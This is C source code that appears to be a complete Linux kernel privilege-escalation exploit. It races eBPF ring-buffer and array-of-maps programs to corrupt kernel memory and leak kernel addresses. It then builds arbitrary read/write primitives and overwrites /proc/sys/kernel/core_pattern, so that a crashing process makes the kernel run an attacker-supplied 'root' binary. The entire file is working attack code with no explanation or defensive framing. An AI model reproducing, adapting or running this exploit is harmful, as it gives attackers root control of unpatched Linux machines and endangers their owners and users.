#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/wait.h>
#include <linux/bpf.h>
#include <sys/mman.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <stddef.h>
#include <sys/stat.h>
#include <sys/epoll.h>
#include <pthread.h>
#include <linux/io_uring.h>
#include <syscall.h>
#include <err.h>
#include <sys/sendfile.h>
#include <sys/resource.h>
#ifndef __NR_BPF
#define __NR_BPF 321
#endif
#define ptr_to_u64(ptr) ((__u64)(unsigned long)(ptr))

#define SYSCHK(x)                                                              \
	({                                                                     \
		typeof(x) __res = (x);                                         \
		if (__res == (typeof(x))-1)                                    \
			err(1, "SYSCHK(" #x ")");                              \
		__res;                                                         \
	})

#define PAUSE                                                                  \
	{                                                                      \
		printf(":");                                                   \
		int x;                                                         \
		read(0, &x, 1);                                                \
	}

#define BPF_F_MMAPABLE 1024
#define BPF_FUNC_ringbuf_query 134
#define BPF_FUNC_ringbuf_reserve 131
#define BPF_MAP_TYPE_RINGBUF 27
#define BPF_FUNC_ringbuf_discard 133
#define BPF_FUNC_ringbuf_output 130

#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)                                 \
	((struct bpf_insn){ .code = CODE,                                      \
			    .dst_reg = DST,                                    \
			    .src_reg = SRC,                                    \
			    .off = OFF,                                        \
			    .imm = IMM })

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)                                        \
	((struct bpf_insn){ .code = BPF_LD | BPF_DW | BPF_IMM,                 \
			    .dst_reg = DST,                                    \
			    .src_reg = SRC,                                    \
			    .off = 0,                                          \
			    .imm = (__u32)(IMM) }),                            \
		((struct bpf_insn){ .code = 0,                                 \
				    .dst_reg = 0,                              \
				    .src_reg = 0,                              \
				    .off = 0,                                  \
				    .imm = ((__u64)(IMM)) >> 32 })

#define BPF_MOV64_IMM(DST, IMM)                                                \
	BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_MOV_REG(DST, SRC)                                                  \
	BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_X, DST, SRC, 0, 0)

#define BPF_MOV64_REG(DST, SRC)                                                \
	BPF_RAW_INSN(BPF_ALU64 | BPF_MOV | BPF_X, DST, SRC, 0, 0)

#define BPF_MOV_IMM(DST, IMM)                                                  \
	BPF_RAW_INSN(BPF_ALU | BPF_MOV | BPF_K, DST, 0, 0, IMM)

#define BPF_RSH_REG(DST, SRC)                                                  \
	BPF_RAW_INSN(BPF_ALU64 | BPF_RSH | BPF_X, DST, SRC, 0, 0)

#define BPF_LSH_IMM(DST, IMM)                                                  \
	BPF_RAW_INSN(BPF_ALU64 | BPF_LSH | BPF_K, DST, 0, 0, IMM)

#define BPF_ALU64_IMM(OP, DST, IMM)                                            \
	BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)

#define BPF_ALU64_REG(OP, DST, SRC)                                            \
	BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_X, DST, SRC, 0, 0)

#define BPF_ALU_IMM(OP, DST, IMM)                                              \
	BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_K, DST, 0, 0, IMM)

#define BPF_JMP_IMM(OP, DST, IMM, OFF)                                         \
	BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#define BPF_JMP_REG(OP, DST, SRC, OFF)                                         \
	BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)

#define BPF_JMP32_REG(OP, DST, SRC, OFF)                                       \
	BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_X, DST, SRC, OFF, 0)

#define BPF_JMP32_IMM(OP, DST, IMM, OFF)                                       \
	BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_K, DST, 0, OFF, IMM)

#define BPF_EXIT_INSN() BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)

#define BPF_LD_MAP_FD(DST, MAP_FD)                                             \
	BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)

#define BPF_LD_IMM64(DST, IMM) BPF_LD_IMM64_RAW(DST, 0, IMM)

#define BPF_ST_MEM(SIZE, DST, OFF, IMM)                                        \
	BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, DST, 0, OFF, IMM)

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)                                       \
	BPF_RAW_INSN(BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

#define BPF_STX_MEM(SIZE, DST, SRC, OFF)                                       \
	BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, DST, SRC, OFF, 0)

#define BPF_LD_ABS(SIZE, IMM)                                                  \
	((struct bpf_insn){ .code = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS,         \
			    .dst_reg = 0,                                      \
			    .src_reg = 0,                                      \
			    .off = 0,                                          \
			    .imm = IMM })

#define BPF_MAP_GET(idx, dst)                                                  \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                                   \
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                          \
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                         \
		BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                        \
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0,                      \
			     BPF_FUNC_map_lookup_elem),                        \
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), BPF_EXIT_INSN(),        \
		BPF_LDX_MEM(BPF_DW, dst, BPF_REG_0, 0),                        \
		BPF_MOV64_IMM(BPF_REG_0, 0)

#define BPF_MAP_GET_ADDR(idx, dst)                                             \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),                                   \
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                          \
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                         \
		BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),                        \
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0,                      \
			     BPF_FUNC_map_lookup_elem),                        \
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), BPF_EXIT_INSN(),        \
		BPF_MOV64_REG((dst), BPF_REG_0), BPF_MOV64_IMM(BPF_REG_0, 0)

#define LOG_BUF_SIZE 65536

#define BPF_HEAVY_JOB                                                          \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_6),                                   \
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_7),                           \
		BPF_MOV64_IMM(BPF_REG_3, 0x10000000),                          \
		BPF_MOV64_IMM(BPF_REG_4, 0x0),                                 \
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0,                      \
			     BPF_FUNC_ringbuf_output)

#define INST(x) (sizeof(x) / sizeof(struct bpf_insn))
#define PAUSE                                                                  \
	{                                                                      \
		printf(":");                                                   \
		int x;                                                         \
		read(0, &x, 1);                                                \
	}

size_t core_pattern, modprobe_path, array_map_ops, array_of_maps_map_ops;
volatile size_t *comsumer, *comsumer2;
volatile size_t *producer, *producer2;
volatile char *mmap_addr;
char bpf_log_buf[LOG_BUF_SIZE];

int mmapfd;
int tempfd;
int heapdata;

void set_cpu(int i)
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(i, &mask);
	sched_setaffinity(0, sizeof(mask), &mask);
}

int bpf_create_map(enum bpf_map_type map_type, unsigned int key_size,
		   unsigned int value_size, unsigned int max_entries,
		   unsigned int map_fd)
{
	union bpf_attr attr = { .map_type = map_type,
				.key_size = key_size,
				.value_size = value_size,
				.max_entries = max_entries,
				.inner_map_fd = map_fd };

	return SYSCHK(syscall(__NR_BPF, BPF_MAP_CREATE, &attr, sizeof(attr)));
}

int bpf_create_map_mmap(enum bpf_map_type map_type, unsigned int key_size,
			unsigned int value_size, unsigned int max_entries,
			unsigned int map_fd)
{
	union bpf_attr attr = {
		.map_type = map_type,
		.key_size = key_size,
		.value_size = value_size,
		.max_entries = max_entries,
		.inner_map_fd = map_fd,
		.map_flags = BPF_F_MMAPABLE,
	};

	return SYSCHK(syscall(__NR_BPF, BPF_MAP_CREATE, &attr, sizeof(attr)));
}

int bpf_lookup_elem(int fd, const void *key, void *value)
{
	union bpf_attr attr = {
		.map_fd = fd,
		.key = ptr_to_u64(key),
		.value = ptr_to_u64(value),
	};

	return SYSCHK(syscall(__NR_BPF, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr)));
}

int bpf_update_elem(int fd, const void *key, const void *value, uint64_t flags)
{
	union bpf_attr attr = {
		.map_fd = fd,
		.key = ptr_to_u64(key),
		.value = ptr_to_u64(value),
		.flags = flags,
	};

	return SYSCHK(syscall(__NR_BPF, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr)));
}

int bpf_prog_load(enum bpf_prog_type type, const struct bpf_insn *insns,
		  int insn_cnt, const char *license)
{
	union bpf_attr attr = {
		.prog_type = type,
		.insns = ptr_to_u64(insns),
		.insn_cnt = insn_cnt,
		.license = ptr_to_u64(license),
		.log_buf = ptr_to_u64(bpf_log_buf),
		.log_size = LOG_BUF_SIZE,
		.log_level = 3,
	};

	return syscall(__NR_BPF, BPF_PROG_LOAD, &attr, sizeof(attr));
}

void *write_msg(void *x)
{
	int fd = *(int *)x;
	ssize_t n = write(fd, "H", 1);
	return NULL;
}

int update_elem(int mapfd, int key, size_t val)
{
	return bpf_update_elem(mapfd, &key, &val, 0);
}

size_t get_elem(int mapfd, int key)
{
	size_t val;
	bpf_lookup_elem(mapfd, &key, &val);
	return val;
}

void load_bpf_prog(struct bpf_insn *prog, int prog_cnt, int *sfd)
{
	int progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, prog_cnt,
				   "GPL");
	if (progfd < 0) {
		puts(bpf_log_buf);
		PAUSE
		_exit(0);
	}
	socketpair(AF_UNIX, SOCK_DGRAM, 0, sfd);
	setsockopt(sfd[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd));
	close(progfd);
}

int init_race_prog(struct bpf_insn **ret, int mapfd, int *ringbuf)
{
	struct bpf_insn prog[] = {
		BPF_LD_MAP_FD(BPF_REG_9, mapfd),
		BPF_MAP_GET_ADDR(0, BPF_REG_8),
		BPF_MOV64_REG(BPF_REG_9, BPF_REG_8),
		BPF_MAP_GET_ADDR(0, BPF_REG_8),
		BPF_LD_MAP_FD(BPF_REG_9, mmapfd),
		BPF_MAP_GET_ADDR(0, BPF_REG_7),
		BPF_ST_MEM(BPF_W, BPF_REG_7, 0, 1),

		BPF_LD_MAP_FD(BPF_REG_9, heapdata),
		BPF_MAP_GET_ADDR(0, BPF_REG_9),

		BPF_LD_MAP_FD(BPF_REG_1, ringbuf[0]),
		BPF_MOV64_IMM(BPF_REG_2, 0x10000000),
		BPF_MOV64_IMM(BPF_REG_3, 0x0),
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0,
			     BPF_FUNC_ringbuf_reserve),
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
		BPF_EXIT_INSN(),
		BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),
		BPF_LD_MAP_FD(BPF_REG_6, ringbuf[1]),

		BPF_MOV64_REG(BPF_REG_1, BPF_REG_6),
		BPF_MOV64_REG(BPF_REG_2, BPF_REG_7),
		BPF_MOV64_IMM(BPF_REG_3, 0x10000000),
		BPF_MOV64_IMM(BPF_REG_4, 0x0),
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0,
			     BPF_FUNC_ringbuf_output),

		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,
		BPF_HEAVY_JOB,

		BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),
		BPF_MOV64_IMM(BPF_REG_2, 0x1),
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0,
			     BPF_FUNC_ringbuf_discard),
		BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0,
			     BPF_FUNC_get_numa_node_id),
		BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0),
		BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, 0),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, -0x110),
		BPF_STX_MEM(BPF_W, BPF_REG_8, BPF_REG_0, 0),
		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN(),
	};
	*ret = calloc(1, sizeof(prog));
	memcpy(*ret, prog, sizeof(prog));
	return INST(prog);
}

int init_leak_prog(struct bpf_insn **ret, int target, int data)
{
	struct bpf_insn prog[] = { BPF_LD_MAP_FD(BPF_REG_9, target),
				   BPF_MAP_GET_ADDR(0, BPF_REG_9),
				   BPF_MAP_GET(0, BPF_REG_8),
				   BPF_LD_MAP_FD(BPF_REG_9, data),
				   BPF_MAP_GET_ADDR(0, BPF_REG_9),
				   BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_8, 0),
				   BPF_MOV64_IMM(BPF_REG_0, 0),
				   BPF_EXIT_INSN() };
	*ret = calloc(1, sizeof(prog));
	memcpy(*ret, prog, sizeof(prog));
	return INST(prog);
}

int init_read_prog(struct bpf_insn **ret, int target)
{
	struct bpf_insn prog[] = {
		BPF_LD_MAP_FD(BPF_REG_9, heapdata),
		BPF_MAP_GET(0, BPF_REG_8),
		BPF_LD_MAP_FD(BPF_REG_9, target),
		BPF_MAP_GET_ADDR(0, BPF_REG_7),
		BPF_MOV64_REG(BPF_REG_9, BPF_REG_7),
		BPF_MAP_GET_ADDR(0x110 / 8, BPF_REG_7),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, -0x110),
		BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),

		BPF_LD_MAP_FD(BPF_REG_9, tempfd),
		BPF_MAP_GET_ADDR(0, BPF_REG_8),
		BPF_MOV64_REG(BPF_REG_9, BPF_REG_8),
		BPF_MAP_GET(0, BPF_REG_8),
		BPF_LD_MAP_FD(BPF_REG_9, heapdata),
		BPF_MAP_GET_ADDR(1, BPF_REG_7),
		BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),
		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN(),
	};
	*ret = calloc(1, sizeof(prog));
	memcpy(*ret, prog, sizeof(prog));
	return INST(prog);
}

int init_write_prog(struct bpf_insn **ret, int target)
{
	struct bpf_insn prog[] = {
		BPF_LD_MAP_FD(BPF_REG_9, heapdata),
		BPF_MAP_GET(0, BPF_REG_8),
		BPF_LD_MAP_FD(BPF_REG_9, target),
		BPF_MAP_GET_ADDR(0, BPF_REG_7),
		BPF_MOV64_REG(BPF_REG_9, BPF_REG_7),
		BPF_MAP_GET_ADDR(0x110 / 8, BPF_REG_7),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, -0x110),
		BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),

		BPF_LD_MAP_FD(BPF_REG_9, tempfd),
		BPF_MAP_GET_ADDR(0, BPF_REG_8),
		BPF_MOV64_REG(BPF_REG_9, BPF_REG_8),
		BPF_MAP_GET_ADDR(0, BPF_REG_8),
		BPF_LD_MAP_FD(BPF_REG_9, heapdata),
		BPF_MAP_GET(1, BPF_REG_7),
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),
		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN(),
	};
	*ret = calloc(1, sizeof(prog));
	memcpy(*ret, prog, sizeof(prog));
	return INST(prog);
}

int init_exploit_prog(struct bpf_insn **ret, int target, int mapfd)
{
	struct bpf_insn prog[] = {
		BPF_LD_MAP_FD(BPF_REG_9, target),
		BPF_MAP_GET_ADDR(0, BPF_REG_7),
		BPF_MOV64_REG(BPF_REG_9, BPF_REG_7),
		BPF_MAP_GET_ADDR(0, BPF_REG_8),
		BPF_LD_MAP_FD(BPF_REG_9, mapfd),
		BPF_MAP_GET(0, BPF_REG_6),
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_6, 0),

		BPF_MOV64_REG(BPF_REG_9, BPF_REG_7),
		BPF_MAP_GET_ADDR(1, BPF_REG_8),
		BPF_LD_MAP_FD(BPF_REG_9, mapfd),
		BPF_MAP_GET(1, BPF_REG_6),
		BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_6, 0),

		BPF_MOV64_REG(BPF_REG_9, BPF_REG_7),
		BPF_MAP_GET_ADDR(3, BPF_REG_8),
		BPF_ST_MEM(BPF_W, BPF_REG_8, 0, BPF_MAP_TYPE_ARRAY_OF_MAPS),
		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN(),

	};
	*ret = calloc(1, sizeof(prog));
	memcpy(*ret, prog, sizeof(prog));
	return INST(prog);
}

void *comsumer_job(void *x)
{
	while (mmap_addr[0] != 2) {
		comsumer[0] = producer[0];
		comsumer2[0] = producer2[0];
	}
}

void *spray_map(void *x)
{
	size_t key = 0;
	size_t fd =
		bpf_create_map(BPF_MAP_TYPE_ARRAY_OF_MAPS, 4, 4, 0x30, tempfd);
	bpf_update_elem(fd, &key, &tempfd, 0);
	return (void *)fd;
}

void exploit(int target, size_t kaddr, size_t heap)
{
	kaddr -= array_map_ops;
	printf("0x%lx 0x%lx\n", kaddr, heap);
	update_elem(tempfd, 0x2, kaddr + array_map_ops);
	update_elem(tempfd, 0x18 / 8 + 0x2, BPF_MAP_TYPE_ARRAY | (4UL << 32));
	update_elem(tempfd, 0x20 / 8 + 0x2, 8 | (0x30UL << 32));
	update_elem(tempfd, 0x28 / 8 + 0x2, 0xffffffff00000000UL);
	update_elem(tempfd, 0x30 / 8 + 0x2, 0xffffffffUL);
	//update_elem(tempfd, 0x38 / 8 + 0x2, 0xfffffffffffffffeUL);
	//update_elem(tempfd, 0x40 / 8 + 0x2, 0x00000000ffffffeaUL);
	//update_elem(tempfd, 0x38 / 8 + 0x2, 0xffffffff);

	int mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, 4, 8, 0x10, 0);
	update_elem(mapfd, 0, kaddr + array_of_maps_map_ops);
	update_elem(mapfd, 1, heap + 0x120);
	struct bpf_insn *exploit_prog = NULL;
	int sfd[2];
	int exploit_prog_cnt = init_exploit_prog(&exploit_prog, target, mapfd);
	load_bpf_prog(exploit_prog, exploit_prog_cnt, sfd);
	write(sfd[0], "H", 1);

	struct bpf_insn *read_prog = NULL;
	int readfd[2];
	int read_prog_cnt = init_read_prog(&read_prog, target);
	load_bpf_prog(read_prog, read_prog_cnt, readfd);

	struct bpf_insn *write_prog = NULL;
	int writefd[2];
	int write_prog_cnt = init_write_prog(&write_prog, target);
	load_bpf_prog(write_prog, write_prog_cnt, writefd);

	size_t *path = (size_t *)"|/proc/%P/fd/666";
	for (int i = 0; i < 2; i++) {
		update_elem(heapdata, 0, kaddr + core_pattern + i * 8);
		update_elem(heapdata, 1, path[i]);
		write(writefd[0], "H", 1);
	}
	if (fork() == 0) {
		*(size_t *)0 = 0;
	}
	while (1)
		sleep(1);
}

int check_core()
{
	// Check if /proc/sys/kernel/core_pattern has been overwritten
	char buf[0x100] = {};
	int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
	read(core, buf, sizeof(buf));
	close(core);
	return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}
void crash(char *cmd)
{
	int memfd = memfd_create("", 0);
	SYSCHK(sendfile(memfd, open("root", 0), 0, 0xffffffff));
	dup2(memfd, 666);
	close(memfd);
	while (check_core() == 0)
		sleep(1);
	/* Trigger program crash and cause kernel to executes program from core_pattern which is our "root" binary */
	*(size_t *)0 = 0;
}

void parse_system_map(char *fname)
{
	char name[0x100];
	char type[0x100];
	char addr[0x100];
	FILE *fp = fopen(fname, "r");
	while (fscanf(fp, "%s\t%s\t%s", addr, type, name) == 3) {
		if (strcmp(name, "core_pattern") == 0)
			core_pattern = strtoull(addr, 0, 16);
		if (strcmp(name, "modprobe_path") == 0)
			modprobe_path = strtoull(addr, 0, 16);
		if (strcmp(name, "array_map_ops") == 0)
			array_map_ops = strtoull(addr, 0, 16);
		if (strcmp(name, "array_of_maps_map_ops") == 0)
			array_of_maps_map_ops = strtoull(addr, 0, 16);
	}

	fclose(fp);
	core_pattern &= 0xfffffff;
	modprobe_path &= 0xfffffff;
	array_map_ops &= 0xfffffff;
	array_of_maps_map_ops &= 0xfffffff;
}

size_t do_leak(int target)
{
	int sfd[2];
	int data = bpf_create_map(BPF_MAP_TYPE_ARRAY, 4, 8, 0x10, 0);
	struct bpf_insn *leak_prog = NULL;
	int leak_prog_cnt = init_leak_prog(&leak_prog, target, data);
	load_bpf_prog(leak_prog, leak_prog_cnt, sfd);
	write(sfd[0], "H", 1);
	size_t ret = get_elem(data, 0);
	close(data);
	close(sfd[0]);
	close(sfd[1]);
	free(leak_prog);
	
	//exit(0);
	return ret;
}
void do_exploit(int *pfd)
{
	size_t fd[0x100];
	size_t key = 0;
	char tmp;
	while (1) {
		while (mmap_addr[0] == 0)
			;

		for (int i = 0; i < 0x80; i++) {
			fd[i] = (int)(size_t)spray_map(NULL);
		}

		read(pfd[0], &tmp, 1);
		for (int i = 0; i < 0x80; i++) {
			size_t kaddr = do_leak((int)fd[i]);
			size_t value = get_elem(heapdata, 0);
			if (kaddr && value) {
				exploit(fd[i], kaddr, value);
				write(pfd[0], "A", 1);
				_exit(0);
			}
			close(fd[i]);
		}
		write(pfd[0], "A", 1);
		_exit(0);
	}
}

int main(int argc, char **argv)
{
	setvbuf(stdout, 0, 2, 0);
	if (fork() ==
	    0) // this process is used to find our process by `pidof billy`
	{
		//set_cpu(1);
		strcpy(argv[0], "billy");
		while (1)
			sleep(100);
	}
	if (fork() == 0) // this process is used to trigger core_pattern exploit
	{
		//set_cpu(1);
		setsid();
		crash("");
	}

	else if (argc > 1) {
		parse_system_map(argv[1]);
		//setup();
	} else {
		printf("%s <System.map>\n", argv[0]);
		exit(0);
	}

	struct rlimit rlim = { .rlim_cur = 0xf000, .rlim_max = 0xf000 };
	setrlimit(RLIMIT_NOFILE, &rlim);

	int ringbuf[2];
	ringbuf[0] = SYSCHK(
		bpf_create_map(BPF_MAP_TYPE_RINGBUF, 0, 0, 0x20000000, 0));
	ringbuf[1] = SYSCHK(
		bpf_create_map(BPF_MAP_TYPE_RINGBUF, 0, 0, 0x20000000, 0));

	comsumer = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED,
			ringbuf[1], 0);
	producer =
		mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, ringbuf[1], 0x1000);
	comsumer2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED,
			 ringbuf[0], 0);
	producer2 =
		mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, ringbuf[0], 0x1000);

	int pfd[2];
	socketpair(AF_UNIX, SOCK_DGRAM, 0, pfd);

	mmapfd = bpf_create_map_mmap(BPF_MAP_TYPE_ARRAY, 4, 8, 0x30, 0);
	mmap_addr = mmap(0, 0x1000, 7, MAP_SHARED, mmapfd, 0);
	heapdata = bpf_create_map(BPF_MAP_TYPE_ARRAY, 4, 8, 0x10, 0);

	tempfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, 4, 8, 0x30, 0);
	int mapfd =
		bpf_create_map(BPF_MAP_TYPE_ARRAY_OF_MAPS, 4, 4, 0x30, tempfd);

	if (fork() == 0)
		do_exploit(pfd);

	pthread_t comsumer_tid;
	pthread_create(&comsumer_tid, 0, comsumer_job, 0);

	int sfd[2] = {};
	struct bpf_insn *race_prog = NULL;
	int race_prog_cnt = init_race_prog(&race_prog, mapfd, ringbuf);
	load_bpf_prog(race_prog, race_prog_cnt, sfd);

	while (1) {
		pthread_t write_tid;
		int array[2];
		char tmp;

		array[0] = bpf_create_map(BPF_MAP_TYPE_ARRAY, 4, 8, 0x30, 0);
		array[1] = bpf_create_map(BPF_MAP_TYPE_ARRAY, 4, 8, 0x30, 0);
		update_elem(mapfd, 0, array[0]);
		close(array[0]);
		pthread_create(&write_tid, 0, write_msg, (void *)&sfd[0]);
		while (mmap_addr[0] == 0)
			;
		update_elem(mapfd, 0, array[1]);
		mmap_addr[0] = 0;
		close(array[1]);
		pthread_join(write_tid, 0);
		write(pfd[1], "H", 1);
		read(pfd[1], &tmp, 1);
		puts("Fail");
		exit(0);
	}
}
